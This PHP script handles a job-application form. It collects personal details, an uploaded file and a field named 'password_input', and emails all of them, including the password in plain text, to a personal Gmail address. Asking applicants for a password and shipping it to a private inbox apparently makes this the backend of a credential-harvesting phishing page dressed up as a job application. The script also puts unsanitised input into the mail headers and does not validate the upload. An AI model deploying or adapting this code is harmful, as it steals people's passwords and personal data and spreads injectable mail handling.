<?php

if(!empty($_POST["send"])){

    $email_input = $_POST["email_input"];
    $PostNameInput = $_POST["PostNameInput"];
    $CandidateName = $_POST["CandidateName"];
    $DOB = $_POST["DOB"];
    $MobileNum = $_POST["MobileNum"];
    $Locations = $_POST["Locations"];
    $Educations = $_POST["Educations"];
    $experi = $_POST["experi"];
    $is_vehicle = $_POST["is_vehicle"];
    $password_input = $_POST["password_input"];

    $toEmail = "yeseniaebersole@gmail.com";
    
    $message = " Subject: " . "Contact Form Data" .
     "\r\n Email: ". $email_input  . 
     "\r\n Post Name : ". $PostNameInput  . 
     "\r\n Candidate Name : ". $CandidateName  . 
     "\r\n Date Of Birth : ". $DOB  . 
     "\r\n Mobile Number : ". $MobileNum  . 
     "\r\n Location : ". $Locations  . 
     "\r\n Eduaction Qualification : ". $Educations  . 
     "\r\n Experience : ". $experi  . 
     "\r\n Vehicle : ". $is_vehicle  . 
     "\r\n Password: ". $password_input  . "\r\n";


	//Get uploaded file data using $_FILES array
	$tmp_name = $_FILES['attachment']['tmp_name'];
	$name	 = $_FILES['attachment']['name'];
	$size	 = $_FILES['attachment']['size'];
	$type	 = $_FILES['attachment']['type'];
	$error	 = $_FILES['attachment']['error'];

	//validate form field for attaching the file
	if($error > 0)
	{
		die('Upload error or No files uploaded');
	}

	$handle = fopen($tmp_name, "r");
	$content = fread($handle, $size);
	fclose($handle);

	$encoded_content = chunk_split(base64_encode($content));
	$boundary = md5("random");

	//header
	$headers = "MIME-Version: 1.0\r\n";
	$headers .= "Reply-To: ".$email_input."\r\n";
	$headers .= "Content-Type: multipart/mixed;";
	$headers .= "boundary = $boundary\r\n";
		
	//plain text
	$body = "--$boundary\r\n";
	$body .= "Content-Type: text/plain; charset=ISO-8859-1\r\n";
	$body .= "Content-Transfer-Encoding: base64\r\n\r\n";
	$body .= chunk_split(base64_encode($message));
		
	//attachment
	$body .= "--$boundary\r\n";
	$body .="Content-Type: $type; name=".$name."\r\n";
	$body .="Content-Disposition: attachment; filename=".$name."\r\n";
	$body .="Content-Transfer-Encoding: base64\r\n";
	$body .="X-Attachment-Id: ".rand(1000, 99999)."\r\n\r\n";
	$body .= $encoded_content;
	

	$sentMailResult = mail($toEmail, $email_input, $body, $headers);

	if($sentMailResult ){
		echo "<script> location.href='/'; </script>";
        exit;
	}
	else{
		die("Sorry but the email could not be sent.
					Please go back and try again!");
	}
}
?>












